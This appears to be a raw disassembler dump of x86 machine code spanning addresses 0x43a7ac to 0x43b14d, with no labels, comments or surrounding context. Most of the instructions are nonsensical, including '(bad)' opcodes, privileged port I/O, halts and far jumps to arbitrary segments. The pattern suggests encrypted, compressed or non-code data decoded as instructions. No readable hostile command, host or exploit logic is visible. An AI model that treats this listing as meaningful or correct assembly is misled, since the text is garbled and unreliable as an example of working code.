  43a7ac:	in     al,0xb2
  43a7ae:	(bad)  
  43a7af:	jnp    0x43a7b5
  43a7b1:	xor    esi,DWORD PTR [ebx-0x385d5f52]
  43a7b7:	imul   edi,DWORD PTR [ecx+0x20],0x2a
  43a7bb:	and    al,BYTE PTR ds:0x3a353281
  43a7c1:	imul   ebp,DWORD PTR [ebx-0x38bd438e],0x4463d94b
  43a7cb:	enter  0x1700,0x44
  43a7cf:	mov    ds:0xa82f6347,al
  43a7d4:	push   cs
  43a7d5:	shr    DWORD PTR [ebx+0x0],1
	...
  43a7f0:	dec    ecx
  43a7f1:	(bad)  
  43a7f2:	call   0xffb18152
  43a7f7:	ss scas eax,DWORD PTR es:[edi]
  43a7f9:	and    ebp,DWORD PTR [edi+0x3b3ebf13]
  43a7ff:	jmp    0x43a822
  43a801:	and    bh,ah
  43a803:	test   cl,ch
  43a805:	aas    
  43a806:	cli    
  43a807:	dec    ebx
  43a808:	sbb    BYTE PTR [ecx+0x3e],0xe9
  43a80c:	jae    0x43a888
  43a80e:	je     0x43a7e9
  43a810:	dec    edi
  43a811:	popf   
  43a812:	aad    0xfe
  43a814:	inc    BYTE PTR cs:[ebx]
  43a817:	jp     0x43a836
  43a819:	push   0xfffffffd
  43a81b:	dec    edx
  43a81c:	dec    eax
  43a81d:	pop    eax
  43a81e:	ds jmp 0xe5b7fb98
  43a824:	sti    
  43a825:	cmp    dh,BYTE PTR [eax-0x6a]
  43a828:	addr16 add eax,0xeacfaa57
  43a82e:	fldcw  WORD PTR [edx]
  43a830:	lock mov ds:0xea46d1fa,al
  43a836:	cli    
  43a837:	mov    dh,0x52
  43a839:	out    0xd9,al
  43a83b:	sub    bh,al
  43a83d:	jg     0x43a7fe
  43a83f:	sbb    eax,0xd9fad5d7
  43a844:	adc    DWORD PTR cs:[ecx+edi*8-0x49],eax
  43a849:	cmp    cl,BYTE PTR [edx+0x4a]
  43a84c:	maxps  xmm7,XMMWORD PTR [esi]
  43a84f:	jmp    0x2b1d8ee4
	...
  43a86c:	add    al,bh
  43a86e:	cmp    eax,0x5f03362f
  43a873:	ds jmp 0x5195e0aa
  43a879:	or     BYTE PTR [ebp-0x6],0x5e
  43a87d:	addr16 add eax,0x44e12a5b
  43a883:	mov    esi,0x802db2b4
  43a888:	add    cl,al
  43a88a:	cmp    eax,0xd40dfffc
  43a88f:	inc    ebx
  43a890:	or     BYTE PTR [edx*2-0x146297e2],cl
  43a897:	cmp    DWORD PTR [eax],eax
  43a899:	addr16 push es
  43a89b:	call   0xf60f6a37
  43a8a0:	test   ch,cl
  43a8a2:	push   esp
  43a8a3:	(bad)  
  43a8a4:	xor    DWORD PTR ds:0x656834db,ebx
  43a8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a8ab:	cmp    DWORD PTR [eax],eax
  43a8ad:	xchg   edi,edi
  43a8af:	out    0x83,eax
  43a8b1:	add    esp,ecx
  43a8b3:	cmc    
  43a8b4:	test   BYTE PTR ds:0xd968e64a,bl
  43a8ba:	push   es
  43a8bb:	add    BYTE PTR [eax],al
  43a8bd:	push   eax
  43a8be:	mov    edx,0xcba2fdf2
  43a8c3:	dec    edx
  43a8c4:	push   0xffffff9d
  43a8c6:	int3   
  43a8c7:	adc    ebp,eax
  43a8c9:	iret   
  43a8ca:	inc    ebp
  43a8cb:	cli    
  43a8cc:	mov    WORD PTR [eax],ss
  43a8ce:	leave  
  43a8cf:	sti    
  43a8d0:	inc    DWORD PTR [eax]
	...
  43a8ea:	bound  esi,QWORD PTR [ebp-0x1e]
  43a8ed:	jge    0x43a90d
  43a8ef:	int3   
  43a8f0:	cmc    
  43a8f1:	test   DWORD PTR [ebp+0x5f],ebx
  43a8f4:	jbe    0x43a8d4
  43a8f6:	into   
  43a8f7:	add    BYTE PTR [edi],al
  43a8f9:	xchg   ebp,eax
  43a8fa:	dec    ebp
  43a8fb:	std    
  43a8fc:	mov    esp,0x816a5d04
  43a901:	in     al,dx
  43a902:	(bad)  
  43a904:	xchg   edx,eax
  43a905:	add    al,0x4d
  43a907:	add    eax,0x65545ee
  43a90c:	dec    ebx
  43a90d:	push   esi
  43a90e:	jmp    0x5:0x5d867e3b
  43a915:	and    al,0xb0
  43a918:	fadd   QWORD PTR [ebx-0xc]
  43a91b:	sub    edi,ebp
  43a91d:	or     bh,BYTE PTR [edx-0x29]
  43a920:	add    eax,DWORD PTR [eax]
  43a922:	hlt    
  43a923:	sub    ebp,DWORD PTR ds:[esi]
  43a926:	and    eax,DWORD PTR [ecx+0x7b]
  43a929:	and    BYTE PTR [edx+eiz*2-0x42],0xff
  43a92e:	xor    BYTE PTR [eax-0x1df40925],0x5b
  43a935:	ret    0x1ad5
  43a938:	dec    ecx
  43a939:	mov    WORD PTR [ecx+0x13],?
  43a93c:	inc    ebx
  43a93d:	cli    
  43a93e:	repz jle 0x43a954
  43a941:	rol    BYTE PTR [esi+ebx*4+0x47],0xb2
  43a946:	pushf  
  43a947:	addr16 mov esi,0xe92f2bff
  43a94d:	push   edi
	...
  43a966:	add    bh,ah
  43a968:	ins    DWORD PTR es:[edi],dx
  43a969:	inc    BYTE PTR [esp+esi*4-0x4578e327]
  43a970:	(bad)  
  43a971:	jb     0x43a8f7
  43a973:	mov    esp,0x44fa4751
  43a978:	(bad)  
  43a979:	pop    ebx
  43a97a:	bswap  ecx
  43a97c:	inc    eax
  43a97d:	inc    edi
  43a97e:	test   BYTE PTR [edx+esi*8-0xe1e0510],dh
  43a985:	and    eax,0x79d8f43e
  43a98a:	test   DWORD PTR [ecx-0x7cb0b8a1],0x340d9e31
  43a994:	cs jns 0x43a956
  43a997:	call   0xf9062cbe
  43a99c:	jmp    0xe668:0x3bc8fa84
  43a9a3:	adc    BYTE PTR [ebx],al
  43a9a5:	sub    eax,0x8aab7f0b
  43a9aa:	dec    edx
  43a9ab:	mov    ah,0x4
  43a9ad:	jmp    0x3b28a2ac
  43a9b2:	les    edi,FWORD PTR [ebx]
  43a9b4:	sub    esi,ebp
  43a9b6:	push   ecx
  43a9b7:	clc    
  43a9b8:	in     al,0x2a
  43a9ba:	les    ebp,FWORD PTR [ebx]
  43a9bc:	add    eax,0xa74fdbd
  43a9c1:	or     DWORD PTR [edx],ebp
  43a9c3:	fiadd  DWORD PTR [ecx+ecx*2]
  43a9c6:	clc    
  43a9c7:	adc    edi,DWORD PTR [eax]
  43a9c9:	mov    DWORD PTR [ecx+0x0],ebp
	...
  43a9e3:	add    BYTE PTR [ebx+0x6],bl
  43a9e6:	mov    esi,0xe901413a
  43a9eb:	scas   al,BYTE PTR es:[edi]
  43a9ec:	jb     0x43aa17
  43a9ee:	addr16 push edi
  43a9f0:	pop    es
  43a9f1:	(bad)  
  43a9f2:	call   0x9a12e4fa
  43a9f7:	jl     0x43aa19
  43a9f9:	in     eax,0xd6
  43a9fb:	ret    
  43a9fc:	fistp  DWORD PTR [edi+0x5123128]
  43aa02:	jmp    0x1324:0x4e5c1a2f
  43aa09:	inc    ebp
  43aa0a:	xor    eax,0x254bcb86
  43aa0f:	add    al,0x46
  43aa11:	mov    gs,ebx
  43aa13:	pop    ebp
  43aa15:	ret    
  43aa16:	call   0x92bc2cf8
  43aa1b:	ret    
  43aa1c:	fwait
  43aa1d:	mov    eax,ds:0xc3a58c85
  43aa22:	call   0xbab892a3
  43aa27:	ret    
  43aa28:	xor    DWORD PTR [esi],0xfffffff3
  43aa2b:	mov    bl,0xe5
  43aa2d:	(bad)  
  43aa2e:	call   0x334be1b5
  43aa33:	inc    edi
  43aa34:	inc    esi
  43aa35:	mov    DWORD PTR [ebx],edi
  43aa37:	pop    eax
  43aa38:	pop    esp
  43aa39:	aaa    
  43aa3a:	jns    0x43aa98
  43aa3c:	(bad)  
  43aa3d:	retf   0x76ff
  43aa40:	mov    ebx,0x96ed3f7e
  43aa45:	pop    es
  43aa46:	int3   
  43aa47:	stos   BYTE PTR es:[edi],al
	...
  43aa60:	add    bh,dh
  43aa62:	jge    0x43aa4d
  43aa64:	call   0x2fcaaf60
  43aa69:	mov    al,0xf
  43aa6b:	inc    eax
  43aa6c:	mov    al,ds:0x7c8c3144
  43aa71:	into   
  43aa72:	cs cli 
  43aa74:	ds mov eax,0xbb37458d
  43aa7a:	add    BYTE PTR [esi+0x6604f7e8],ch
  43aa80:	std    
  43aa81:	inc    edi
  43aa82:	(bad)  
  43aa83:	mov    WORD PTR [edi+eax*8+0x5016c7b6],ss
  43aa8a:	sar    BYTE PTR [edi+0xe],0x33
  43aa8e:	cmp    DWORD PTR [edi-0x3e803379],0xdf7ebf99
  43aa98:	stos   BYTE PTR es:[edi],al
  43aa99:	test   DWORD PTR [edi+0x3b3d2184],0x1a2039fa
  43aaa3:	(bad)  
  43aaa5:	xor    al,BYTE PTR [ecx+0x7624e6bf]
  43aaab:	xor    eax,0x2f0dc4aa
  43aab0:	test   eax,0xb1848dc1
  43aab5:	sub    al,0x3b
  43aab7:	cli    
  43aab8:	jo     0x43aae3
  43aaba:	add    eax,0x810ce900
  43aabf:	aad    0xa2
  43aac1:	cmp    bh,BYTE PTR [ebx]
  43aac3:	xchg   DWORD PTR [ecx],eax
	...
  43aadd:	add    BYTE PTR [eax+0x4f9374cd],dh
  43aae3:	jb     0x43aa6b
  43aae5:	sub    eax,esi
  43aae7:	xchg   DWORD PTR [eax+eax*1-0xa325b],eax
  43aaee:	std    
  43aaef:	mov    ebp,0x422c9813
  43aaf4:	cli    
  43aaf5:	sub    al,0xc8
  43aaf8:	cmc    
  43aaf9:	push   ebx
  43aafa:	jle    0x43ab58
  43aafc:	stc    
  43aafd:	push   edx
  43aafe:	daa    
  43aaff:	add    DWORD PTR [eax+0x0],ebp
  43ab02:	sbb    eax,0x908d8002
  43ab07:	stc    
  43ab08:	sti    
  43ab09:	(bad)  
  43ab0a:	mov    edx,0xd945bd71
  43ab0f:	mov    edi,0xbf1dffff
  43ab14:	adc    eax,DWORD PTR [eax+0x2f]
  43ab17:	inc    edx
  43ab18:	cli    
  43ab19:	mov    bl,ch
  43ab1b:	cmp    al,0xff
  43ab1e:	popa   
  43ab1f:	pop    ss
  43ab20:	dec    ebx
  43ab21:	lea    esp,[eax-0x7f00b543]
  43ab27:	mov    ebp,0xcd25858b
  43ab2c:	cmc    
  43ab2d:	(bad)  
  43ab2e:	jge    0x43ab97
  43ab30:	cmc    
  43ab31:	adc    eax,0x3a33a1
  43ab36:	push   eax
  43ab37:	ret    0x66e
  43ab3a:	inc    esi
  43ab3b:	jbe    0x43ab33
  43ab3d:	mov    DWORD PTR [eax],edx
  43ab3f:	leave  
  43ab40:	push   eax
  43ab41:	inc    DWORD PTR [eax]
	...
  43ab5b:	mov    al,0x35
  43ab5d:	or     DWORD PTR [eax-0x63],eax
  43ab60:	mov    esp,0xc90ef843
  43ab65:	cmc    
  43ab66:	je     0x43aaf9
  43ab68:	cdq    
  43ab69:	push   DWORD PTR [ebx-0x61]
  43ab6c:	adc    al,0xc0
  43ab6e:	shl    DWORD PTR [ebp+0x466c913],1
  43ab74:	mov    ebp,0xbf58c843
  43ab79:	cmc    
  43ab7a:	(bad)  
  43ab7b:	hlt    
  43ab7c:	test   al,0x3b
  43ab7e:	cld    
  43ab7f:	imul   eax,DWORD PTR [esi+0x7d54175b],0x44
  43ab86:	mov    WORD PTR [ecx+0x73],?
  43ab89:	inc    edx
  43ab8a:	cli    
  43ab8b:	push   ebx
  43ab8c:	sbb    eax,0x7
  43ab8f:	dec    ebx
  43ab90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ab91:	fist   DWORD PTR [ebx-0x770195d6]
  43ab97:	fnstcw WORD PTR [ebx-0x5b0bc1d7]
  43ab9d:	loop   0x43ab4a
  43ab9f:	inc    edx
  43aba0:	push   0xfffffffe
  43aba2:	cli    
  43aba3:	dec    ebx
  43aba4:	rol    DWORD PTR [eax-0x23],cl
  43aba7:	sbb    esi,esi
  43aba9:	fld    TBYTE PTR [ebx]
  43abab:	lea    ebp,[ebx-0x2]
  43abae:	cli    
  43abaf:	loope  0x43ab40
  43abb1:	lock aas 
  43abb3:	hlt    
  43abb4:	and    bh,BYTE PTR [edi]
  43abb6:	jae    0x43aba5
  43abb8:	mov    dl,0x4b
  43abba:	out    0x48,eax
  43abbc:	icebp  
  43abbd:	inc    esp
  43abbe:	cli    
	...
  43abd7:	add    bh,bl
  43abd9:	and    BYTE PTR [eax],dl
  43abdb:	rcr    BYTE PTR [esi],0xdf
  43abde:	iret   
  43abdf:	add    dh,BYTE PTR [edi+0x21]
  43abe2:	push   edx
  43abe3:	(bad)  
  43abe4:	aaa    
  43abe5:	push   ds
  43abe6:	std    
  43abe7:	out    0xd0,eax
  43abe9:	adc    BYTE PTR [ebp-0x6],al
  43abec:	and    ecx,esp
  43abee:	xchg   ebx,eax
  43abef:	add    BYTE PTR [edi],bl
  43abf1:	jne    0x43ac32
  43abf3:	push   esp
  43abf4:	jg     0x43ac40
  43abf6:	jg     0x43abdb
  43abf8:	lods   al,BYTE PTR ds:[esi]
  43abf9:	popf   
  43abfa:	push   edx
  43abfb:	inc    ebx
  43abfc:	sti    
  43abfd:	sbb    eax,0x1b424efe
  43ac02:	adc    edi,edx
  43ac04:	jg     0x43ac7b
  43ac06:	jg     0x43abea
  43ac08:	cmc    
  43ac09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ac0a:	mov    dl,0x23
  43ac0c:	lock add al,0x70
  43ac0f:	out    0xf7,al
  43ac11:	sub    DWORD PTR ds:0x600ae904,esp
  43ac17:	out    0xb,al
  43ac19:	push   ebx
  43ac1a:	and    eax,0xba1cc504
  43ac1f:	dec    eax
  43ac20:	pop    esi
  43ac21:	xor    al,0x64
  43ac23:	inc    ebx
  43ac24:	enter  0xb70b,0x43
  43ac28:	pop    esp
  43ac29:	(bad)  
  43ac2a:	out    0x3,eax
  43ac2c:	hlt    
  43ac2d:	xlat   BYTE PTR ds:[ebx]
  43ac2e:	rol    BYTE PTR [ebx],1
  43ac30:	hlt    
  43ac31:	cld    
  43ac32:	call   0x55ddae7
  43ac37:	repz jmp 0x43ac3e
  43ac3a:	xchg   BYTE PTR [ebx],ch
	...
  43ac54:	add    BYTE PTR [ebp-0x38],al
  43ac57:	call   0xd5fe0764
  43ac5c:	inc    esp
  43ac5d:	call   0xc0783c6
  43ac62:	adc    BYTE PTR [di],ch
  43ac65:	ret    0x7104
  43ac68:	out    0x32,al
  43ac6a:	inc    eax
  43ac6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ac6c:	add    ebx,ebx
  43ac6e:	or     ebp,DWORD PTR [ebx]
  43ac70:	(bad)  
  43ac71:	mov    dl,0x3f
  43ac73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ac74:	add    esi,ebp
  43ac76:	sahf   
  43ac77:	hlt    
  43ac78:	mov    edx,DWORD PTR [ebx+0x2d03a551]
  43ac7e:	jge    0x43ac50
  43ac80:	or     BYTE PTR [ebx-0x34316004],0x7f
  43ac87:	sbb    esp,esp
  43ac89:	jmp    0xfbef9552
  43ac8e:	push   edx
  43ac8f:	and    eax,0x405aaf04
  43ac94:	pop    eax
  43ac95:	mov    edx,0xc542e8c7
  43ac9a:	and    DWORD PTR [eax+ebp*8],0x40ffd503
  43aca1:	repnz xor bh,dl
  43aca4:	jmp    0xb32fbd19
  43aca9:	mov    bl,0x33
  43acab:	stc    
  43acac:	hlt    
  43acad:	iret   
  43acae:	sbb    BYTE PTR [eax-0x17],al
  43acb1:	jp     0x43ac7a
  43acb3:	and    ebx,ebp
  43acb5:	rsqrtps xmm6,xmm6
  43acb8:	xchg   BYTE PTR [eax],al
	...
  43acd2:	mov    bh,0x87
  43acd4:	mov    edi,0xf6fa79f5
  43acd9:	cld    
  43acda:	push   edx
  43acdb:	ret    0x34e
  43acde:	stc    
  43acdf:	pushf  
  43ace0:	push   edi
  43ace1:	inc    edi
  43ace2:	xor    esi,DWORD PTR [ebx]
  43ace4:	stc    
  43ace5:	hlt    
  43ace6:	sub    edx,DWORD PTR [eax+eax*2]
  43ace9:	jmp    0x4443ad60
  43acee:	cmp    esi,DWORD PTR [ebx]
  43acf0:	stc    
  43acf1:	mov    dh,BYTE PTR [edi+eiz*1+0x7212e93e]
  43acf8:	or     ch,BYTE PTR [ebp+0x2b]
  43acfb:	cs cli 
  43acfd:	cs shr dl,1
  43ad00:	sti    
  43ad01:	es mov bh,0x87
  43ad04:	mov    edi,0xfabc7bee
  43ad09:	push   ss
  43ad0a:	aaa    
  43ad0b:	das    
  43ad0c:	jae    0x43acd3
  43ad0e:	repz sbb al,0x58
  43ad11:	add    eax,0x29832f37
  43ad16:	out    0x88,eax
  43ad18:	cmp    al,0xf6
  43ad1a:	ss das 
  43ad1c:	cli    
  43ad1d:	aam    0xf
  43ad1f:	adc    eax,0x9652e940
  43ad24:	(bad)  [edx]
  43ad26:	clc    
  43ad27:	stc    
  43ad28:	neg    BYTE PTR [ecx+eax*8-0x75]
  43ad2c:	adc    al,0x15
  43ad2e:	push   ss
  43ad2f:	repz (bad) 
  43ad31:	inc    ebp
  43ad33:	push   eax
  43ad34:	loope  0x43ad33
	...
  43ad4e:	add    BYTE PTR [edx+0x33],dl
  43ad51:	mov    ecx,0xf713190f
  43ad56:	call   DWORD PTR [edx+0x23]
  43ad59:	add    esi,DWORD PTR [ebx+esi*4]
  43ad5c:	dec    ebx
  43ad5d:	cli    
  43ad5e:	mov    ds:0x39ea95,al
  43ad63:	inc    esi
  43ad64:	repz jae 0x43ad96
  43ad67:	shl    BYTE PTR [ecx+0x64ca01e],0x0
  43ad6e:	call   0x43b83f
  43ad73:	out    dx,al
  43ad74:	xchg   ebx,eax
  43ad75:	jle    0x43ad9b
  43ad77:	nop
  43ad78:	cld    
  43ad79:	(bad)  
  43ad7a:	(bad)  
  43ad7b:	jge    0x43ad44
  43ad7d:	xor    ebp,DWORD PTR [ebx+esi*8]
  43ad80:	dec    edx
  43ad81:	cli    
  43ad82:	mov    eax,0x39ea75
  43ad87:	xor    eax,0xd43dc8e
  43ad8c:	scas   al,BYTE PTR es:[edi]
  43ad8d:	or     al,0x93
  43ad8f:	scas   al,BYTE PTR es:[edi]
  43ad90:	mov    edx,esp
  43ad92:	pop    edx
  43ad93:	js     0x43ad59
  43ad95:	cmc    
  43ad96:	dec    DWORD PTR [ecx+0x2a]
  43ad99:	push   es
  43ad9a:	call   0x399fe3
  43ad9f:	pop    ecx
  43ada0:	mov    BYTE PTR ds:0xf5c41184,0xff
  43ada7:	or     ecx,DWORD PTR [edx+0x1e]
  43adaa:	or     al,0xcf
  43adac:	jns    0x43adab
  43adae:	out    0x0,eax
  43adb0:	repnz cmc 
  43adb2:	inc    DWORD PTR [eax]
	...
  43adcc:	test   BYTE PTR [edi],0xb0
  43adcf:	add    DWORD PTR [edi-0x726afa36],eax
  43add5:	and    ebx,DWORD PTR [eax+0x5b]
  43add8:	es jmp 0xeb8c:0xf0f4c35b
  43ade0:	ja     0x43ae29
  43ade2:	cmp    eax,DWORD PTR [eax+0x63388]
  43ade8:	hlt    
  43ade9:	sbb    ecx,ebx
  43adeb:	mov    WORD PTR [eax-0x1],cs
  43adee:	mov    ds:0x261b83fd,eax
  43adf3:	xor    bh,0x1b
  43adf6:	dec    BYTE PTR [eax+ebp*8-0x56184bb9]
  43adfd:	loop   0x43ae3c
  43adff:	cli    
  43ae00:	outs   dx,DWORD PTR ds:[esi]
  43ae01:	fwait
  43ae02:	and    eax,0xac1bf400
  43ae07:	std    
  43ae08:	sbb    BYTE PTR [edi+0x1bf2fce7],0xfe
  43ae0f:	push   eax
  43ae10:	inc    ebx
  43ae11:	cmp    BYTE PTR [esi],al
  43ae13:	lea    ebp,[eax-0x7397e801]
  43ae19:	mov    ebp,0xc413ffc4
  43ae1e:	addr16 stc 
  43ae20:	and    edx,DWORD PTR [ebp+ebp*1-0x74e40c00]
  43ae27:	sar    DWORD PTR [edx],0x1b
  43ae2a:	(bad)  
  43ae2b:	aas    
  43ae2c:	mov    ebp,0x8c3570
	...
  43ae49:	mov    eax,0x8e500c07
  43ae4e:	sbb    al,0xa6
  43ae50:	push   edi
  43ae51:	rcr    BYTE PTR [ebx-0x2],cl
  43ae54:	cli    
  43ae55:	add    DWORD PTR [esi],edi
  43ae57:	adc    eax,DWORD PTR [eax-0xc]
  43ae5a:	mov    ds:0xb2e28433,al
  43ae5f:	sbb    bl,bh
  43ae61:	jmp    0xf483c187
  43ae66:	js     0x43aedf
  43ae68:	inc    ebx
  43ae6a:	push   ds
  43ae6b:	mov    cl,0x8
  43ae6d:	and    al,BYTE PTR ds:0x13f816e2
  43ae73:	sub    DWORD PTR [ebx+ebx*8],eax
  43ae76:	xor    DWORD PTR ss:[ebp+0x265dcfb5],ecx
  43ae7d:	cmp    BYTE PTR [ebx-0x14],al
  43ae80:	add    ebp,DWORD PTR [ecx]
  43ae82:	jl     0x43ae50
  43ae84:	test   BYTE PTR [edi+0x472f672d],dl
  43ae8a:	or     ch,cl
  43ae8c:	add    esp,DWORD PTR [edi]
  43ae8e:	and    BYTE PTR [eax+ebp*8],0xfb
  43ae92:	sbb    al,0xe7
  43ae94:	add    al,0xf4
  43ae96:	add    al,0x92
  43ae98:	mov    dh,0xf3
  43ae9a:	jnp    0x43aeb7
  43ae9c:	adc    BYTE PTR [ecx-0x77],ch
  43ae9f:	int3   
  43aea0:	test   WORD PTR [ecx+ebp*8],0x4ed3
  43aea6:	cli    
  43aea7:	les    esp,FWORD PTR [ecx+0x2]
  43aeaa:	add    eax,0xc65e
	...
  43aec3:	add    BYTE PTR [eax],al
  43aec5:	add    bl,dh
  43aec7:	pushf  
  43aec8:	and    BYTE PTR ds:0xaf5104f2,0x57
  43aecf:	das    
  43aed0:	push   ecx
  43aed1:	loopne 0x43af4d
  43aed3:	sub    ch,BYTE PTR [ebx-0x63fb10bb]
  43aed9:	mov    WORD PTR [edi],ds
  43aedb:	test   BYTE PTR [ebx+ebp*4-0x5b],cl
  43aedf:	das    
  43aee0:	mov    ebx,0x50ca710f
  43aee5:	sar    esi,cl
  43aee7:	mov    ecx,0x2f9f2bf0
  43aeec:	sbb    DWORD PTR [eax+0x78],eax
  43aeef:	leave  
  43aef0:	jo     0x43aec5
  43aef2:	pop    ecx
  43aef3:	add    eax,0xc3bddb81
  43aef8:	call   0xd628973d
  43aefd:	ret    
  43aefe:	retf   
  43aeff:	jp     0x43af00
  43af01:	clc    
  43af02:	jns    0x43af39
  43af04:	jae    0x43aed8
  43af06:	mov    DWORD PTR [edx],ebp
  43af08:	push   ecx
  43af09:	out    0xd,al
  43af0b:	adc    DWORD PTR [edi],ecx
  43af0d:	sub    eax,esi
  43af0f:	mov    DWORD PTR [edi+0x7ff1fd5d],edi
  43af15:	jmp    0xf7b7b411
  43af1a:	test   eax,0xe6e5142a
  43af1f:	(bad)  
  43af20:	(bad)  
  43af21:	stc    
  43af22:	aaa    
  43af23:	into   
  43af24:	enter  0xe8ab,0x4
  43af28:	xchg   DWORD PTR [edi+0x0],ebp
	...
  43af42:	add    BYTE PTR [edi],bl
  43af44:	xor    edx,DWORD PTR [edx+esi*2+0x24]
  43af48:	aad    0x50
  43af4a:	bound  eax,QWORD PTR ds:0xf02ad9f9
  43af50:	mov    edi,0x2a0c9152
  43af55:	cld    
  43af56:	jle    0x43af9f
  43af58:	push   esi
  43af59:	mov    BYTE PTR [eax+eax*1],ch
  43af5c:	idiv   DWORD PTR [esi-0x40200d0c]
  43af62:	push   eax
  43af63:	mov    ebp,0x5de9fa2f
  43af68:	xor    DWORD PTR [ebp-0x46],ecx
  43af6b:	test   al,cl
  43af6d:	pop    es
  43af6e:	mov    ecx,0xf1742a42
  43af73:	jg     0x43af45
  43af75:	cli    
  43af76:	ror    edx,cl
  43af78:	sub    dl,BYTE PTR [eiz*2+0x63ffc4e9]
  43af7f:	mov    al,0xb8
  43af81:	add    ebp,DWORD PTR [edi]
  43af83:	mov    ebp,0xd048002b
  43af88:	dec    esp
  43af89:	ds jmp 0xe056fe05
  43af8f:	lods   al,BYTE PTR ds:[esi]
  43af90:	cli    
  43af91:	push   ecx
  43af92:	add    BYTE PTR [esi+0x2c],al
  43af95:	data16 adc bl,BYTE PTR [ebp-0x5247b4fe]
  43af9c:	sar    BYTE PTR [ecx],1
  43af9e:	add    BYTE PTR [esi-0x2121cc03],dh
  43afa4:	or     BYTE PTR [edx+0x4],ah
	...
  43afbf:	add    BYTE PTR [esi-0x27720dc3],bl
  43afc5:	adc    al,0x51
  43afc7:	push   eax
  43afc8:	loop   0x43afb7
  43afca:	rol    BYTE PTR [ebp-0x20692a3],1
  43afd0:	shr    ch,1
  43afd2:	dec    ecx
  43afd3:	mov    eax,0x39d081
  43afd8:	idiv   bl
  43afda:	xor    ebx,esi
  43afdc:	push   ds
  43afdd:	or     DWORD PTR [edx+0x4],esp
  43afe0:	pop    esi
  43afe1:	cmp    eax,0xf1188df2
  43afe6:	dec    edi
  43afe7:	push   eax
  43afe8:	and    ch,dh
  43afea:	rcr    BYTE PTR [esi-0x20],1
  43afed:	shl    DWORD PTR [ebx+0x3],0xcb
  43aff1:	cmp    al,0xf5
  43aff3:	inc    DWORD PTR [eax+0x4d43deee]
  43aff9:	stos   BYTE PTR es:[edi],al
  43affa:	mul    ah
  43affc:	pop    esi
  43affd:	add    dh,bh
  43afff:	jne    0x43af96
  43b001:	push   esi
  43b002:	loop   0x43af8a
  43b004:	ret    0xf5ee
  43b007:	test   ch,cl
  43b009:	ins    BYTE PTR es:[edi],dx
  43b00a:	stc    
  43b00b:	std    
  43b00c:	pusha  
  43b00d:	out    dx,eax
  43b00e:	cmc    
  43b00f:	xor    eax,0x39dd1d
  43b014:	test   DWORD PTR [ecx],eax
  43b016:	in     eax,0x43
  43b018:	or     eax,0xb2f873ef
  43b01d:	fldenv [ecx-0x9]
  43b020:	or     ch,bh
  43b022:	jle    0x43afe4
	...
  43b03c:	add    ah,dh
  43b03e:	nop
  43b03f:	std    
  43b040:	stc    
  43b041:	xor    edi,edi
  43b043:	neg    BYTE PTR [ebx+edx*8-0x51]
  43b047:	pop    ss
  43b048:	push   0xfffe9bf4
  43b04d:	daa    
  43b04e:	aaa    
  43b04f:	mov    dl,0xf7
  43b051:	and    ebx,DWORD PTR [edi]
  43b053:	adc    bh,BYTE PTR [eax+0x6]
  43b056:	fadd   QWORD PTR [ebx]
  43b058:	jmp    0xfa7fff40
  43b05d:	outs   dx,DWORD PTR ds:[esi]
  43b05e:	loopne 0x43b09b
  43b060:	push   esi
  43b061:	lods   eax,DWORD PTR ds:[esi]
  43b062:	pop    ecx
  43b063:	or     eax,DWORD PTR [eax]
  43b065:	push   ds
  43b066:	sbb    al,0x3b
  43b068:	xor    al,0x88
  43b06a:	inc    edi
  43b06b:	sar    bh,0x82
  43b06e:	push   eax
  43b06f:	sbb    cl,BYTE PTR [edi]
  43b071:	xor    al,0x1c
  43b073:	xor    edx,edi
  43b075:	subps  xmm6,XMMWORD PTR [edi+edx*8]
  43b079:	aaa    
  43b07a:	clc    
  43b07b:	mov    ch,BYTE PTR [ebx+0x18]
  43b07e:	test   al,0x7e
  43b080:	jmp    0x43b072
  43b082:	sbb    esi,edi
  43b084:	jmp    FWORD PTR [edx-0x5b9c3d48]
  43b08a:	mov    al,ds:0x5ea4e7c2
  43b08f:	ret    0xc63
  43b092:	sbb    al,0xfe
  43b094:	push   DWORD PTR [ebx]
  43b096:	xor    BYTE PTR [esi],bl
  43b098:	adc    BYTE PTR [ebx+ebx*1+0x28a9bf81],dh
  43b09f:	mov    DWORD PTR [eax+eax*1+0x0],esi
	...
  43b0b7:	add    BYTE PTR [eax],al
  43b0b9:	add    BYTE PTR [ebx+edx*4],cl
  43b0bc:	jb     0x43b0bd
  43b0be:	adc    ebx,DWORD PTR [ebx]
  43b0c0:	es shr bh,cl
  43b0c3:	out    dx,al
  43b0c4:	cmp    al,0x86
  43b0c6:	leave  
  43b0c7:	mov    edx,DWORD PTR [eax+eax*2]
  43b0ca:	hlt    
  43b0cb:	mov    dl,bl
  43b0cd:	mov    dh,0x10
  43b0cf:	add    eax,0xd7f403e8
  43b0d4:	aad    0x3c
  43b0d6:	jo     0x43b05a
  43b0d8:	cwde   
  43b0d9:	cmp    eax,0xd3b12cde
  43b0de:	into   
  43b0df:	push   ebx
  43b0e0:	gs dec eax
  43b0e2:	(bad)  
  43b0e3:	jns    0x43b148
  43b0e5:	mov    ah,0xbd
  43b0e7:	sub    al,0xf1
  43b0e9:	shr    DWORD PTR [edx+ecx*4+0x78],cl
  43b0ed:	cmp    eax,0x16e12cae
  43b0f2:	pop    eax
  43b0f3:	push   ss
  43b0f4:	sub    DWORD PTR [ecx+edi*2],eax
  43b0f7:	inc    ebp
  43b0f8:	pop    ebx
  43b0f9:	or     ebp,DWORD PTR [ebx]
  43b0fb:	jp     0x43b160
  43b0fd:	mov    bl,0x8d
  43b0ff:	sub    al,0xc1
  43b101:	sub    dl,dh
  43b103:	pushf  
  43b104:	call   0x6448a50b
  43b109:	xchg   BYTE PTR [edi+0x2b],dh
  43b10c:	test   eax,0xa1d4c63c
  43b111:	push   ebp
  43b112:	jmp    0x5078:0xe88eec40
  43b119:	jae    0x43b176
  43b11b:	sub    al,0xe8
  43b11d:	sub    eax,DWORD PTR [eax]
	...
  43b137:	retf   0x820f
  43b13a:	cmp    al,0x78
  43b13c:	mov    dl,0x28
  43b13e:	jl     0x43b0c4
  43b140:	add    eax,0x9b4c03e9
  43b145:	int    0x3c
  43b147:	sub    BYTE PTR cs:[edx],0xd3
  43b14b:	js     0x43b10f
  43b14d:	ins    BYTE PTR es:[edi],dx
